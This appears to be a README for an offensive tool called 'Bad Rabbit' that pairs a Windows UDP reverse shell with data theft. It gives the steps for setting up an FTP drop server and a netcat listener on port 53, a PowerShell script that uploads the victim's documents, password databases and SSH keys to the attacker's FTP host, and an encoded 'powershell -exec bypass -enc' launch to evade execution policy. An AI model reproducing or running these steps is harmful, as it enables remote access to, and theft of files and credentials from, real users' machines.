# Bad Rabbit  
## Windows-Reverse-shell 

## NetCore compiling   

Don't forget like on my payload obfuscation repository is ncessary to compile our C# with NetCore

```sh
dotnet new console -o <nameofproject>
cd <nameofproject>
code . (allowing to open the progam.cs in vscode directly)
```  
in this Folder using the program.cs and write or copy our code, and compile it.

```sh
dotnet build
```
But if you want the compilation in one file only you can run that:
```sh
dotnet publish -r win-x64 -c Release /p:PublishSingleFile=true
```
## Prerequisties
### Installation of FTP server  
```sh
apt install vsftpd
```  
### if is necessary open the firewall port  
```sh
sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.orig
nano /etc/vsftpd.conf
```  

modify this lines if is necessary :
```sh
listen=YES
listen_ipv6=NO
connect_from_port_20=YES
anonymous_enable=NO
local_enable=YES
write_enable=YES
chroot_local_user=YES
allow_writeable_chroot=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
pasv_enable=YES
pasv_min_port=40000
pasv_max_port=45000
userlist_enable=YES
userlist_file=/etc/vsftpd.userlist
userlist_deny=NO
```  
and add this if is not in:
```sh
allow_writeable_chroot=YES
```  
```sh
adduser "username" 
echo "username" | sudo tee -a /etc/vsftpd.userlist
sudo systemctl restart vsftpd
```  
## Begin Exploit  
after that check the connection on the server, if it doesn't work give the write rights on the destination folder (on the server)  

### Listen on our server machine 
using netcat on UDP port because we are build a UDP server connection

```sh
nc -luvnp 53
```
Executing our UDP reverse shell which we are compile previously  

### Powershell script to extract all the data we want  
```sh
$WebClient = New-Object System.Net.WebClient
$Dir="C:\Users\$env:UserName\"
$FTP = "ftp://USER:PASSWORD@OURIP/"
foreach($item in (Get-ChildItem $Dir -Recurse -Include *.docx, *.txt, *.xlsx, *.csv, *.pptx, *.kdbx, *.png, *.jpg, *.zip, *.rar, *.ppk, *.pem, *.xml, *.db, *.rtf)){;"Uploading $item...";$URI = New-Object System.Uri($FTP+$item.Name) ;$WebClient.UploadFile($URI, $item.FullName)}
``` 
### We can add any type of file extension and change the folder where we want to extract the data  


### Final step for the success of our exploit; convert string to UTF-16LE and encode in base 64 to bypass the execution problems  
we can use this links but is completely possible to make it in terminal  
https://raikia.com/tool-powershell-encoder/
```sh
powershell.exe -exec bypass -enc .....
```
